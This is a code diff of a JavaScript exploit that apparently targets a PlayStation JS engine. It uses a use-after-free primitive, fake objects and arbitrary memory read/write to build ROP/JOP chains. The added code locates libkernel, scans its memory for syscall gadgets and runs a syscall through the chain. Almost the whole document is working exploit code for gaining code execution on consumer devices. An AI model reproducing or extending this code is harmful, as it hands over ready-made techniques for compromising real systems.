@@ -433,6 +433,7 @@ for (var i = 0; i < uaf_arr.length; i += 2) {
 }
 
 if (prim_uaf_idx === -1) {
+  jsmaf.exit()
   throw new Error("Failed to find marked array !!")
 }
 
@@ -592,6 +593,9 @@ log(`_read_addr: ${_read_addr}`)
 var syscall_fn_addr = _read_addr.add(new BigInt(0, 7))
 log(`syscall_fn_addr: ${syscall_fn_addr}`)
 
+var sceKernelGetModuleInfoFromAddr_ptr = mem.read8(libc_addr.add(new BigInt(0, 0xDBDA8)))
+log(`sceKernelGetModuleInfoFromAddr_ptr: ${sceKernelGetModuleInfoFromAddr_ptr}`)
+
 var jsmaf_gc_addr = mem.addrof(jsmaf.gc)
 log(`addrof(jsmaf.gc): ${jsmaf_gc_addr}`)
 
@@ -665,6 +669,9 @@ var rop = {
       throw new Error("Invalid store, minimal size is 8 to store RSP");
     }
 
+    // Reset index but don't zero memory - JSC may reference it
+    rop.idx = 0
+
     var header = []
 
     header.push(gadgets.PUSH_RBP_POP_RCX_RET)
@@ -702,11 +709,16 @@ var rop = {
 
     fake(0, 0, 0, mem.fakeobj(jop_stack_store))
 
-    mem.free(fake.executable)
-    mem.free(jop_stack_store)
-    mem.free(jop_stack_addr)
-    
-    rop.clear()
+    // Restore leak_obj to valid state - JSC may access it
+    leak_obj.obj = {}
+
+    // Don't free immediately - JSC may still have references
+    // mem.free(fake.executable)
+    // mem.free(jop_stack_store)
+    // mem.free(jop_stack_addr)
+
+    // Don't clear ROP stack either - JSC may still reference it
+    // rop.clear()
   },
   fake_builtin: function(addr) {
     function fake() {}
@@ -765,7 +777,11 @@ var fn = {
       var ctx = []
       var insts = []
 
-      var regs = [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_JO_RET]
+      // For syscalls: RDI, RSI, RDX, R10, R8, R9 (R10 not RCX because syscall clobbers RCX)
+      // For functions: RDI, RSI, RDX, RCX, R8, R9
+      var regs = syscall
+        ? [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_R10_RET, gadgets.POP_R8_RET, gadgets.POP_R9_JO_RET]
+        : [gadgets.POP_RDI_RET, gadgets.POP_RSI_RET, gadgets.POP_RDX_RET, gadgets.POP_RCX_RET, gadgets.POP_R8_RET, gadgets.POP_R9_JO_RET]
 
       insts.push(gadgets.POP_RAX_RET)
       insts.push(syscall ? id : BigInt.Zero)
@@ -838,6 +854,11 @@ var funcs = [
   {input: libc_addr.add(new BigInt(0, 0x5F0)), name: "sceKernelGetModuleInfoForUnwind", ret: true},
   {input: 0x14, name: "getpid", ret: true},
   {input: 0x29, name: "dup", ret: true},
+  {input: 0x18, name: "getuid", ret: true},
+  {input: 0x19, name: "geteuid", ret: true},
+  {input: 0x74, name: "gettimeofday", ret: true},
+  {input: libc_addr.add(new BigInt(0, 0x6C6F0)), name: "strlen", ret: true},
+  {input: libc_addr.add(new BigInt(0, 0x3E430)), name: "printf", ret: true},
 ]
 
 for (var i = 0; i < funcs.length; i++) {
@@ -845,14 +866,196 @@ for (var i = 0; i < funcs.length; i++) {
   fn.register(func.input, func.name, func.ret)
 }
 
+var module_info_buf = mem.malloc(0x300)
+var insts = []
 
-log("=== TESTING DUP ===")
+insts.push(gadgets.POP_RDI_RET)
+insts.push(sceKernelGetModuleInfoFromAddr_ptr)
+insts.push(gadgets.POP_RSI_RET)
+insts.push(new BigInt(0, 0x1))
+insts.push(gadgets.POP_RDX_RET)
+insts.push(module_info_buf)
+insts.push(sceKernelGetModuleInfoFromAddr_ptr)
 
-// Try to duplicate stdout (fd 1)
-var new_fd = fn.dup(new BigInt(0, 1))
+var store_size = 0x10
+var store_addr = mem.malloc(store_size)
+rop.store(insts, store_addr, 1)
 
-log("Original FD: 1 (stdout)")
-log("Duplicated FD: " + new_fd)
-log("Duplicated FD (hex): " + new_fd.toString())
+try {
+    rop.execute(insts, store_addr, store_size)
+    var ret_val = mem.read8(store_addr.add(new BigInt(0, 8)))
 
-alert("Duplicated FD: " + new_fd)
+    if (ret_val.lo() === 0) {
+        var libkernel_base = mem.read8(module_info_buf.add(new BigInt(0, 0x160)))
+        var segment_count = mem.read4(module_info_buf.add(new BigInt(0, 0x1A0))).lo()
+
+        var libkernel_size = 0
+        for (var s = 0; s < segment_count; s++) {
+            var seg_offset = 0x160 + (s * 16)
+            var seg_size = mem.read4(module_info_buf.add(new BigInt(0, seg_offset + 8))).lo()
+            libkernel_size += seg_size
+        }
+
+        log("libkernel_base: " + libkernel_base.toString())
+        log("libkernel_size: 0x" + libkernel_size.toString(16))
+
+        mem.free(store_addr)
+        mem.free(module_info_buf)
+        log("Scanning for Syscall Gadgets...")
+
+        var pattern = [0x48, 0xC7, 0xC0, -1, -1, -1, -1, 0x49, 0x89, 0xCA, 0x0F, 0x05, 0x72, 0x01, 0xC3]
+        var scan_size = libkernel_size
+        var chunk_size = 0x200
+        var num_chunks = Math.floor(scan_size / chunk_size)
+
+        var matches_found = 0
+        var syscall_gadgets = {}
+        var base_lo = libkernel_base.lo()
+        var base_hi = libkernel_base.hi()
+        var chunk_data = new Array(chunk_size)
+        var found_addrs_lo = []
+        var found_addrs_hi = []
+        var found_syscalls = []
+
+        for (var chunk = 0; chunk < num_chunks; chunk++) {
+            try {
+                var chunk_offset = chunk * chunk_size
+
+                var addr_lo = base_lo + chunk_offset
+                var addr_hi = base_hi
+                if (addr_lo >= 0x100000000) {
+                    addr_lo -= 0x100000000
+                    addr_hi++
+                }
+
+                for (var c = 0; c < chunk_size; c++) {
+                    chunk_data[c] = -1
+                }
+
+                for (var q = 0; q < chunk_size; q += 8) {
+                    try {
+                        var read_lo = addr_lo + q
+                        var read_hi = addr_hi
+                        if (read_lo >= 0x100000000) {
+                            read_lo -= 0x100000000
+                            read_hi++
+                        }
+
+                        master[4] = read_lo
+                        master[5] = read_hi
+
+                        var low_dword = slave[0]
+                        var high_dword = slave[1]
+
+                        if (q + 0 < chunk_size) chunk_data[q + 0] = low_dword & 0xFF
+                        if (q + 1 < chunk_size) chunk_data[q + 1] = (low_dword >>> 8) & 0xFF
+                        if (q + 2 < chunk_size) chunk_data[q + 2] = (low_dword >>> 16) & 0xFF
+                        if (q + 3 < chunk_size) chunk_data[q + 3] = (low_dword >>> 24) & 0xFF
+                        if (q + 4 < chunk_size) chunk_data[q + 4] = high_dword & 0xFF
+                        if (q + 5 < chunk_size) chunk_data[q + 5] = (high_dword >>> 8) & 0xFF
+                        if (q + 6 < chunk_size) chunk_data[q + 6] = (high_dword >>> 16) & 0xFF
+                        if (q + 7 < chunk_size) chunk_data[q + 7] = (high_dword >>> 24) & 0xFF
+                    } catch (e) {
+                        for (var b = 0; b < 8 && (q + b) < chunk_size; b++) {
+                            chunk_data[q + b] = -1
+                        }
+                    }
+                }
+
+                for (var i = 0; i < chunk_size - pattern.length; i++) {
+                    var match = true
+
+                    for (var p = 0; p < pattern.length; p++) {
+                        var expected = pattern[p]
+                        if (expected !== -1) {
+                            if (chunk_data[i + p] === -1 || chunk_data[i + p] !== expected) {
+                                match = false
+                                break
+                            }
+                        }
+                    }
+
+                    if (match) {
+                        var syscall_num = (chunk_data[i + 3] & 0xFF) |
+                                         ((chunk_data[i + 4] & 0xFF) << 8) |
+                                         ((chunk_data[i + 5] & 0xFF) << 16) |
+                                         ((chunk_data[i + 6] & 0xFF) << 24)
+
+                        if (syscall_num >= 0 && !syscall_gadgets[syscall_num]) {
+                            var gadget_offset = chunk_offset + i
+                            var gadget_lo = base_lo + gadget_offset
+                            var gadget_hi = base_hi
+                            if (gadget_lo >= 0x100000000) {
+                                gadget_lo -= 0x100000000
+                                gadget_hi++
+                            }
+
+                            found_addrs_lo.push(gadget_lo)
+                            found_addrs_hi.push(gadget_hi)
+                            found_syscalls.push(syscall_num)
+                            syscall_gadgets[syscall_num] = true
+                            matches_found++
+                        }
+                    }
+                }
+            } catch (e) {
+                // Silent
+            }
+        }
+
+        log("")
+        log("Found " + matches_found + " syscall gadgets")
+
+        for (var f = 0; f < found_syscalls.length; f++) {
+            var syscall_num = found_syscalls[f]
+            var gadget_addr = new BigInt(found_addrs_hi[f], found_addrs_lo[f])
+            syscall_gadgets[syscall_num] = gadget_addr
+        }
+
+        var syscall_wrapper_addr = null
+        for (var num in syscall_gadgets) {
+            var gadget_addr = syscall_gadgets[num]
+            syscall_wrapper_addr = gadget_addr.add(new BigInt(0, 10))
+            log("syscall_wrapper: " + syscall_wrapper_addr.toString())
+            break
+        }
+
+        if (syscall_wrapper_addr) {
+
+            log("testing getuid Syscall")
+
+            var test_insts = []
+            test_insts.push(gadgets.POP_RAX_RET)
+            test_insts.push(new BigInt(0, 0x18))
+            test_insts.push(syscall_wrapper_addr)
+
+            var test_store_size = 0x10
+            var test_store_addr = mem.malloc(test_store_size)
+            rop.store(test_insts, test_store_addr, 1)
+
+            try {
+                rop.execute(test_insts, test_store_addr, test_store_size)
+
+                var uid = mem.read8(test_store_addr.add(new BigInt(0, 8)))
+                log("getuid returned: " + uid.lo())
+
+                mem.free(test_store_addr)
+            } catch (e) {
+                log("failed: " + e.message)
+                mem.free(test_store_addr)
+            }
+        } else {
+            log("")
+            log("ERROR: No syscall gadgets found")
+        }
+    } else {
+        log("ERROR: sceKernelGetModuleInfoFromAddr failed with code: " + ret_val.lo())
+        mem.free(store_addr)
+        mem.free(module_info_buf)
+    }
+} catch (e) {
+    log("")
+    log("ERROR: ROP execution failed - " + e.message)
+    mem.free(store_addr)
+    mem.free(module_info_buf)
+}
